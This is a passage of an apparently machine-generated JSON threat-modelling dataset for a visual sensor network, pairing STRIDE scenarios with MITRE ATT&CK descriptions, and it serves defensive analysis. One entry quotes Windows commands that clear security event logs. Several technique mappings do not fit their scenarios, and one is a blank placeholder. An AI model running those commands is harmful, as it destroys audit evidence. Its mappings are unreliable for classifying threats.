                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of known vulnerabilities in the Linux kernel.",
            "Assumptions": [
                {
                    "Assumption": "Known vulnerabilities not patched.",
                    "Role": "System Administrator",
                    "Condition": "True if system is not updated regularly."
                },
                {
                    "Assumption": "Accessible network.",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is reachable by attackers."
                },
                {
                    "Assumption": "Lack of intrusion detection.",
                    "Role": "Security Engineer",
                    "Condition": "Exists if there is no active monitoring for exploits."
                }
            ],
            "Potential Impact": "Potential OS crash leading to service outages.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability",
                "exploitation",
                "kernel"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Overloading the central command server with malicious requests.",
            "Assumptions": [
                {
                    "Assumption": "Central server exposed to public network.",
                    "Role": "System Architect",
                    "Condition": "True if server is not isolated."
                },
                {
                    "Assumption": "Lack of load balancing.",
                    "Role": "System Administrator",
                    "Condition": "Valid if load balancing systems are absent."
                },
                {
                    "Assumption": "No DDoS prevention.",
                    "Role": "Security Engineer",
                    "Condition": "Exists if there are no countermeasures for DDoS."
                }
            ],
            "Potential Impact": "Service disruption affecting data collection and management.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "server",
                "request",
                "overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of firmware vulnerabilities to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Exploitable firmware bugs.",
                    "Role": "Developer",
                    "Condition": "True if firmware is not secure."
                },
                {
                    "Assumption": "Physical access to devices.",
                    "Role": "Attacker",
                    "Condition": "Valid if devices are not physically secured."
                },
                {
                    "Assumption": "No firmware integrity checks.",
                    "Role": "System Admin",
                    "Condition": "Exists if there are no integrity checks on firmware."
                }
            ],
            "Potential Impact": "Gaining of unauthorized access rights and control.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "firmware",
                "exploitation",
                "access"
            ],
            "mitre_technique": {
                "name": "Bootkit",
                "description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
                "id": "attack-pattern--02fefddc-fb1b-423f-a76b-7552dd211d4d",
                "technique_id": "T1067"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of Linux kernel vulnerabilities to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "True if system is outdated and vulnerable."
                },
                {
                    "Assumption": "Accessible network.",
                    "Role": "Attacker",
                    "Condition": "Valid if network access is not restricted."
                },
                {
                    "Assumption": "No monitoring tools.",
                    "Role": "Security Engineer",
                    "Condition": "Exists if system lacks intrusion detection tools."
                }
            ],
            "Potential Impact": "Full compromise of the operating system and data.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "kernel",
                "vulnerabilities",
                "root access"
            ],
            "mitre_technique": {
                "name": "Rootkit",
                "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
                "id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
                "technique_id": "T1014"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Using unsecured APIs to escalate privileges unauthorizedly.",
            "Assumptions": [
                {
                    "Assumption": "APIs lack proper authentication.",
                    "Role": "Developer",
                    "Condition": "True if APIs do not require strong authentication."
                },
                {
                    "Assumption": "APIs expose sensitive functions.",
                    "Role": "System Architect",
                    "Condition": "Valid if API endpoints are poorly designed."
                },
                {
                    "Assumption": "Network access.",
                    "Role": "Attacker",
                    "Condition": "Exists if the attacker has access to network."
                }
            ],
            "Potential Impact": "Unauthorized access to high-privilege functions.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "api",
                "access",
                "functions"
            ],
            "mitre_technique": {
                "name": "Acquire Infrastructure",
                "description": "Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
                "id": "attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2",
                "technique_id": "T1583"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "29",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access to camera nodes by spoofing sensor node identities within the Visual Sensor Network (VSN).",
            "Assumptions": [
                {
                    "Assumption": "Default credentials or weak access controls on sensor nodes.",
                    "Role": "System Administrator",
                    "Condition": "If nodes are not configured with strong, unique credentials."
                },
                {
                    "Assumption": "Network traffic is not properly encrypted.",
                    "Role": "Network Administrator",
                    "Condition": "If secure communication protocols are not used."
                },
                {
                    "Assumption": "Lack of mutual authentication mechanism between nodes.",
                    "Role": "System Architect",
                    "Condition": "If the system is designed without mutual authentication."
                }
            ],
            "Potential Impact": "Unauthorized access leading to data breaches and unauthorized surveillance.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "identity",
                "access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker manipulates the VSN to falsely appear as a legitimate user, accessing and controlling visual data streams from the cameras.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging of authentication attempts.",
                    "Role": "Security Officer",
                    "Condition": "If failed login attempts are not logged or monitored."
                },
                {
                    "Assumption": "No multi-factor authentication (MFA) in place.",
                    "Role": "System Administrator",
                    "Condition": "If users authenticate using only single-factor methods."
                },
                {
                    "Assumption": "The network includes legacy devices with outdated security protocols.",
                    "Role": "IT Infrastructure Manager",
                    "Condition": "If old devices that don't support modern security measures are in use."
                }
            ],
            "Potential Impact": "Data tampering and unauthorized control over the VSN.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity",
                "unauthorized access",
                "control"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Intruder uses fake credentials or exploits vulnerabilities in the authentication process to impersonate an admin.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication processes and input validation.",
                    "Role": "Software Developer",
                    "Condition": "If input data is not correctly validated and sanitized."
                },
                {
                    "Assumption": "Administrator accounts do not have sufficient protection.",
                    "Role": "System Administrator",
                    "Condition": "If admin accounts use weak passwords or are easily guessable."
                },
                {
                    "Assumption": "Vulnerability in authentication mechanism allows bypass.",
                    "Role": "Security Analyst",
                    "Condition": "If there is a known vulnerability in the authentication mechanism."
                }
            ],
            "Potential Impact": "Full control over VSN, leading to access and manipulation of all captured data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential",
                "impersonation",
                "admin"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware on camera nodes to capture and transmit unauthorized data.",
            "Assumptions": [
                {
                    "Assumption": "Access to physical device or network pathway.",
                    "Role": "Physical Security",
                    "Condition": "If cameras are physically accessible to attackers."
                },
                {
                    "Assumption": "No firmware integrity checks in place.",
                    "Role": "Firmware Engineer",
                    "Condition": "If the system does not verify firmware integrity before running."
                },
                {
                    "Assumption": "Weak or absent encryption during firmware updates.",
                    "Role": "System Administrator",
                    "Condition": "If firmware updates are not securely distributed and applied."
                }
            ],
            "Potential Impact": "Compromised data integrity and leakage of sensitive visual data.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "device",
                "modification"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters visual data being transmitted over the network to introduce false information.",
            "Assumptions": [
                {
                    "Assumption": "Network encryption is not properly implemented.",
                    "Role": "Network Engineer",
                    "Condition": "If secure communication protocols are not used for data transmission."
                },
                {
                    "Assumption": "Network traffic is unmonitored for anomalies.",
                    "Role": "Security Analyst",
                    "Condition": "If there is no network monitoring or anomaly detection in place."
                },
                {
                    "Assumption": "Insufficient integrity checks on transmitted data.",
                    "Role": "Software Developer",
                    "Condition": "If data packets lack integrity verification mechanisms such as checksums."
                }
            ],
            "Potential Impact": "Compromised data integrity leading to false information and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data",
                "network",
                "transmission"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious software update distributes tampered software to the VSN leading to compromised functionality.",
            "Assumptions": [
                {
                    "Assumption": "Software updates are not verified before installation.",
                    "Role": "System Administrator",
                    "Condition": "If updates are applied without integrity and authenticity checks."
                },
                {
                    "Assumption": "Lack of secure distribution channels for software updates.",
                    "Role": "Software Developer",
                    "Condition": "If there are no secure channels for software distribution."
                },
                {
                    "Assumption": "Admin rights on devices are loosely controlled.",
                    "Role": "IT Manager",
                    "Condition": "If unauthorized individuals have access to administrative functions."
                }
            ],
            "Potential Impact": "Functional disruption and potential unauthorized access to all network nodes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "software",
                "update",
                "distribution"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes records of their unauthorized activity, making it hard to trace the breach.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging and auditing mechanisms.",
                    "Role": "System Auditor",
                    "Condition": "If logging mechanisms are simple or easily bypassed."
                },
                {
                    "Assumption": "Log integrity and tamper protection is weak.",
                    "Role": "System Administrator",
                    "Condition": "If logs can be altered without detection."
                },
                {
                    "Assumption": "Different components lack synchronized timestamps.",
                    "Role": "Software Developer",
                    "Condition": "If logs from different parts of the system do not have synchronized time."
                }
            ],
            "Potential Impact": "Difficulty in incident response and prolonged undiscovered breaches.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "erasure",
                "masking"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having performed an action that they actually did, such as deleting critical visual data.",
            "Assumptions": [
                {
                    "Assumption": "Lack of user action logging.",
                    "Role": "System Administrator",
                    "Condition": "If user actions are not adequately logged."
                },
                {
                    "Assumption": "Weak access control and authentication.",
                    "Role": "Network Administrator",
                    "Condition": "If access control does not sufficiently authenticate users."
                },
                {
                    "Assumption": "Absence of non-repudiation mechanisms.",
                    "Role": "Security Architect",
                    "Condition": "If there are no measures to ensure recorded actions can be indisputably attributed to a user."
                }
            ],
            "Potential Impact": "Loss of critical data and challenge in proving malicious activity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user",
                "denial",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Path Interception by PATH Environment Variable",
                "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line. \n\nAdversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.\n\nFor example, on Windows if an adversary places a malicious program named \"net.exe\" in `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe` in the PATH environment variable, when \"net\" is executed from the command-line the `C:\\example path` will be called instead of the system's legitimate executable at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the `$PATH` variable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic Rules macOS launchctl 2022)",
                "id": "attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32",
                "technique_id": "T1574.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious insider modifies logs to cover their tracks after unauthorized access to visual data.",
            "Assumptions": [
                {
                    "Assumption": "Insider has sufficient access rights.",
                    "Role": "HR and IT Security",
                    "Condition": "If roles and permissions are not tightly controlled."
                },
                {
                    "Assumption": "Inadequate segregation of duties.",
                    "Role": "Compliance Officer",
                    "Condition": "If system roles allow single points of failure with high privileges."
                },
                {
                    "Assumption": "Insufficient real-time log analysis.",
                    "Role": "Security Analyst",
                    "Condition": "If log monitoring and analysis are not conducted in real-time."
                }
            ],
            "Potential Impact": "Hinderance in forensic investigations and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "insider threat",
                "log modification",
                "cover tracks"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive visual data being transmitted over the network gets intercepted and accessed by unauthorized entities.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission is not encrypted.",
                    "Role": "Network Engineer",
                    "Condition": "If encryption protocols like TLS are not used."
                },
                {
                    "Assumption": "Data is transmitted over unsecured networks.",
                    "Role": "IT Support",
                    "Condition": "If the network does not employ secure configurations such as VPNs."
                },
                {
                    "Assumption": "Lack of intrusion detection systems (IDS).",
                    "Role": "Security Analyst",
                    "Condition": "If there are no IDS to detect unauthorized access."
                }
            ],
            "Potential Impact": "Compromised data confidentiality and potential data leakage.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "interception",
                "network",
                "visual data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored on camera nodes is accessed by unauthorized personnel.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate physical security of nodes.",
                    "Role": "Physical Security",
                    "Condition": "If devices are physically accessible by unauthorized personnel."
                },
                {
                    "Assumption": "Insufficient access control mechanisms on local storage.",
                    "Role": "System Administrator",
                    "Condition": "If file-level encryption or access controls are weak or missing."
                },
                {
                    "Assumption": "Nodes are left in default configuration.",
                    "Role": "IT Staff",
                    "Condition": "If nodes are deployed without proper security configurations."
                }
            ],
            "Potential Impact": "Exposure of sensitive visual data and unauthorized viewing.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "access",
                "local storage",
                "unauthorized"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory 